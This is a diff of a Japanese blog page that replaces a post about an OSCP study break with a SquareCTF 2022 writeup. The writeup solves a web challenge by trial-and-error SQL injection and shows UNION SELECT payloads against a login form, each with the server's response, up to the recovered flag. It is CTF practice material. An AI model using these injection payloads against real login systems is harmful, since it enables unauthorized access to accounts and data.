@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-  <title>Taking a break... (and will be doing OSCP for a year) - CTF フラxxグゲット</title>
+  <title>SquaareCTF 2022 Writeup - CTF フラxxグゲット</title>
   <meta name="renderer" content="webkit" />
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
 
@@ -16,7 +16,7 @@
 <meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
 
 
-<meta name="author" content="CaptureAmerica @ CTF フラxxグゲット" /><meta name="description" content="Save The Earth! - 地球環境を守ろう！ 2021年1月にOSCPに合格してから、そろそろ1年が経とうとしています。 OSCPの有効期限は2年なので、そろそろ" /><meta name="keywords" content="CTF, Writeup, captureamerica, picoCTF" />
+<meta name="author" content="CaptureAmerica @ CTF フラxxグゲット" /><meta name="description" content="Save The Earth! - 地球環境を守ろう！ URL: https://2022.squarectf.com/challenges （最近、ちょくちょくCTFイベントに参加しているんですが、全然解けない事が多いです。。。全体的に難易度あがって" /><meta name="keywords" content="CTF, Writeup, captureamerica, picoCTF" />
 
 
 
@@ -26,7 +26,7 @@
 <meta name="generator" content="Hugo 0.74.2 with theme even" />
 
 
-<link rel="canonical" href="https://captureamerica.github.io/writeups/post/taking_a_break/" />
+<link rel="canonical" href="https://captureamerica.github.io/writeups/post/squarectf_2022/" />
 <link rel="apple-touch-icon" sizes="180x180" href="https://captureamerica.github.io/writeups/apple-touch-icon.png">
 <link rel="icon" type="image/png" sizes="32x32" href="https://captureamerica.github.io/writeups/favicon-32x32.png">
 <link rel="icon" type="image/png" sizes="16x16" href="https://captureamerica.github.io/writeups/favicon-16x16.png">
@@ -39,23 +39,23 @@
 
 
 
-<meta property="og:title" content="Taking a break... (and will be doing OSCP for a year)" />
-<meta property="og:description" content="Save The Earth! - 地球環境を守ろう！ 2021年1月にOSCPに合格してから、そろそろ1年が経とうとしています。 OSCPの有効期限は2年なので、そろそろ" />
+<meta property="og:title" content="SquaareCTF 2022 Writeup" />
+<meta property="og:description" content="Save The Earth! - 地球環境を守ろう！ URL: https://2022.squarectf.com/challenges （最近、ちょくちょくCTFイベントに参加しているんですが、全然解けない事が多いです。。。全体的に難易度あがって" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://captureamerica.github.io/writeups/post/taking_a_break/" />
-<meta property="article:published_time" content="2021-11-06T10:00:00+09:00" />
-<meta property="article:modified_time" content="2022-04-07T11:00:00+09:00" />
-<meta itemprop="name" content="Taking a break... (and will be doing OSCP for a year)">
-<meta itemprop="description" content="Save The Earth! - 地球環境を守ろう！ 2021年1月にOSCPに合格してから、そろそろ1年が経とうとしています。 OSCPの有効期限は2年なので、そろそろ">
-<meta itemprop="datePublished" content="2021-11-06T10:00:00&#43;09:00" />
-<meta itemprop="dateModified" content="2022-04-07T11:00:00&#43;09:00" />
-<meta itemprop="wordCount" content="338">
+<meta property="og:url" content="https://captureamerica.github.io/writeups/post/squarectf_2022/" />
+<meta property="article:published_time" content="2022-11-20T15:00:00+09:00" />
+<meta property="article:modified_time" content="2022-11-20T15:00:00+09:00" />
+<meta itemprop="name" content="SquaareCTF 2022 Writeup">
+<meta itemprop="description" content="Save The Earth! - 地球環境を守ろう！ URL: https://2022.squarectf.com/challenges （最近、ちょくちょくCTFイベントに参加しているんですが、全然解けない事が多いです。。。全体的に難易度あがって">
+<meta itemprop="datePublished" content="2022-11-20T15:00:00&#43;09:00" />
+<meta itemprop="dateModified" content="2022-11-20T15:00:00&#43;09:00" />
+<meta itemprop="wordCount" content="620">
 
 
 
-<meta itemprop="keywords" content="OSCP," /><meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="Taking a break... (and will be doing OSCP for a year)"/>
-<meta name="twitter:description" content="Save The Earth! - 地球環境を守ろう！ 2021年1月にOSCPに合格してから、そろそろ1年が経とうとしています。 OSCPの有効期限は2年なので、そろそろ"/>
+<meta itemprop="keywords" content="CTF," /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="SquaareCTF 2022 Writeup"/>
+<meta name="twitter:description" content="Save The Earth! - 地球環境を守ろう！ URL: https://2022.squarectf.com/challenges （最近、ちょくちょくCTFイベントに参加しているんですが、全然解けない事が多いです。。。全体的に難易度あがって"/>
 
 <!--[if lte IE 9]>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
@@ -132,12 +132,12 @@
           <article class="post">
     
     <header class="post-header">
-      <h1 class="post-title">Taking a break... (and will be doing OSCP for a year)</h1>
+      <h1 class="post-title">SquaareCTF 2022 Writeup</h1>
 
       <div class="post-meta">
-        <span class="post-time"> 2021-11-06 </span>
+        <span class="post-time"> 2022-11-20 </span>
         <div class="post-category">
-            <a href="https://captureamerica.github.io/writeups/categories/oscp/"> OSCP </a>
+            <a href="https://captureamerica.github.io/writeups/categories/ctf/"> CTF </a>
             </div>
         
       </div>
@@ -146,7 +146,16 @@
     <div class="post-toc" id="post-toc">
   <h2 class="post-toc-title">Contents</h2>
   <div class="post-toc-content">
-    <nav id="TableOfContents"></nav>
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#web-alex-hanlon-has-the-flag-50-points">[Web]: Alex Hanlon Has The Flag! (50 points)</a>
+      <ul>
+        <li><a href="#challenge">Challenge</a></li>
+        <li><a href="#solution">Solution</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
   </div>
 </div>
     <div class="post-content">
@@ -154,28 +163,97 @@
 <img src="https://captureamerica.github.io/writeups/img/10_Nature_Themed_Icons_Cute_Earth_Icon.png" alt="Save The Earth!"> <b><font color="teal">Save The Earth! - 地球環境を守ろう！</font></b> <img src="https://captureamerica.github.io/writeups/img/10_Nature_Themed_Icons_Cute_Earth_Icon.png" alt="Save The Earth!">
 <img src="https://captureamerica.github.io/writeups/img/green_bar.png" alt="green_bar.png">
 <div class='align-right'>
-<a href="https://translate.google.com/translate?hl=en&sl=ja&tl=en&u=https%3A%2F%2Fcaptureamerica.github.io%2Fwriteups%2Fpost%2Ftaking_a_break%2F">
+<a href="https://translate.google.com/translate?hl=en&sl=ja&tl=en&u=https%3A%2F%2Fcaptureamerica.github.io%2Fwriteups%2Fpost%2Fsquarectf_2022%2F">
 <img src="https://captureamerica.github.io/writeups/img/En.png" alt="English">
 </a>
 </div>
-<p>2021年1月にOSCPに合格してから、そろそろ1年が経とうとしています。</p>
-<p><s>OSCPの有効期限は2年</s>なので、そろそろ更新に向けて勉強を再開しようと思い、<a href="https://www.offensive-security.com/learn/">Learn One</a> を始めることにしました。</p>
-<p>今日から1年間、Learn Oneをメインでやっていこうと思うので、CTFは基本的にお休みします。</p>
-<p>PicoCTFとかは、やろうと思います。</p>
+<p>URL: <a href="https://2022.squarectf.com/challenges">https://2022.squarectf.com/challenges</a>
+<br /><br /></p>
+<p>（最近、ちょくちょくCTFイベントに参加しているんですが、全然解けない事が多いです。。。全体的に難易度あがってません？？）</p>
+<br>
+えーっと、50点のチャレンジ2つと、Sanity Checkを1問解いただけです。
+<p>101点を獲得し、最終順位は250位でした。<br /></p>
+<img src="https://captureamerica.github.io/writeups/img/squarectf_2022_score.png" alt="squarectf_2022_score.png">
+<p><br><br></p>
+<p>とりあえず、記念に一個だけ、writeupを残しておきます。</p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="web-alex-hanlon-has-the-flag-50-points">[Web]: Alex Hanlon Has The Flag! (50 points)</h2>
+<hr>
+<h3 id="challenge">Challenge</h3>
+<blockquote>
+<p>Alex Hanlon has saved the flag in his account! See if you can figure out his username and then login as him. But just know that it will be impossible to brute force his password.
+<br /><br />
+<a href="http://chals.2022.squarectf.com:4102">http://chals.2022.squarectf.com:4102</a></p>
+</blockquote>
+<br>
+<h3 id="solution">Solution</h3>
+<p>UsernameとPasswordが入力できるログインフォームが表示されます。</p>
+<p><br />
+Usernameに<code>alex</code>、PasswordにテキトーなSQLiのパターンを入れたときに、</p>
+<pre>
+Sorry, admin is the wrong user
+</pre>
+<p>というエラーが返ります。<code>admin</code>なんて入力してないのに。。</p>
+<p><br /></p>
+<p>実は、次に出てくるチャレンジ「Going In Blind」のDescriptionに、<code>Ok, the developers got smart, and figured out a way to prevent SQLi in the login page. Plus, they decided the flag shouldn't be hardcoded in the web application anymore. </code> という記載があって、それもヒントになってますね。</p>
+<p>おそらく、内部的に以下のようになっているっぽいです。</p>
+<pre>
+SELECT * FROM user WHERE username = 'admin' and PASSWORD = '$password'
+</pre>
+<p><br /><br />
+ここからはトライ＆エラーです。</p>
+<p>入力値：</p>
+<pre>
+' union select 1, schema_name, 3 from information_schema.schemata;-- -
+</pre>
+<p>結果：</p>
+<pre>
+java.sql.SQLException: The used SELECT statements have a different number of columns
+</pre>
 <p><br /><br /></p>
-<p>ではでは〜。Try Harder!!</p>
+<p>入力値：</p>
+<pre>
+' union select schema_name from information_schema.schemata;-- -
+</pre>
+<p>結果：</p>
+<pre>
+Sorry, information_schema is the wrong user
+</pre>
+<p><br /><br /></p>
+<p>入力値：（テーブル名とカラム名は完全なGuessです）</p>
+<pre>
+' union select username from user where id = 1;-- -
+</pre>
+<p>結果：</p>
+<pre>
+java.sql.SQLSyntaxErrorException: Unknown column 'id' in 'where clause'
+</pre>
+<p><br /><br /></p>
+<p>入力値：</p>
+<pre>
+' union select username from user where username like 'al%';-- -
+</pre>
+<p>結果：</p>
+<pre>
+Nope, try again!
+</pre>
+<p><br /><br /></p>
+<p>入力値：</p>
+<pre>
+' union select username from user where username <> 'admin';-- -
+</pre>
+<p>結果：</p>
+<pre>
+flag{470bbbc0519e4bc6987bb00bef24a97a}
+</pre>
+<p><br /><br /></p>
+<p>Flag: <code>flag{470bbbc0519e4bc6987bb00bef24a97a}</code></p>
 <p><br /><br />
 <br /><br /></p>
 <hr>
-<p>(2022/04/07 - 追記)</p>
-<p><u><b>OSCPのCertificationは、expireしない</b></u>ようです。どういうわけか、2年でexpireしちゃうと勘違いしてたみたい。</p>
-<img src="https://captureamerica.github.io/writeups/img/OSCP_FAQ.png" alt="OSCP_FAQ.png">
-<p><br /></p>
-<p>ExpireしないのがわかっていたらLearn Oneやってなかったかも知れないけど、やったらやったでかなり勉強になっているので、残りの半年も続けて頑張ろうと思います！</p>
-<p><br /><br /></p>
-<p><br /><br /></p>
-<hr>
-<p><br /><br /></p>
+<p><br /><br />
+<br /><br /></p>
 
     </div>
 
@@ -187,7 +265,7 @@
   <p class="copyright-item">
     <span class="item-title">LastMod</span>
     <span class="item-content">
-        2022-04-07
+        2022-11-20
         
     </span>
   </p>
@@ -196,16 +274,12 @@
 </div>
 <footer class="post-footer">
       <div class="post-tags">
-          <a href="https://captureamerica.github.io/writeups/tags/oscp/">OSCP</a>
+          <a href="https://captureamerica.github.io/writeups/tags/ctf/">CTF</a>
           </div>
       <nav class="post-nav">
-        <a class="prev" href="https://captureamerica.github.io/writeups/post/kringlecon_2021/">
-            <i class="iconfont icon-left"></i>
-            <span class="prev-text nav-default">SAN Holiday Hack Challenge (Kringlecon) 2021 Writeup</span>
-            <span class="prev-text nav-mobile">Prev</span>
-          </a>
-        <a class="next" href="https://captureamerica.github.io/writeups/post/killerqueen_ctf_2021/">
-            <span class="next-text nav-default">Killer Queen CTF 2021 Writeup</span>
+        
+        <a class="next" href="https://captureamerica.github.io/writeups/post/learnone_completed/">
+            <span class="next-text nav-default">LearnOne (OSCP) completed</span>
             <span class="next-text nav-mobile">Next</span>
             <i class="iconfont icon-right"></i>
           </a>
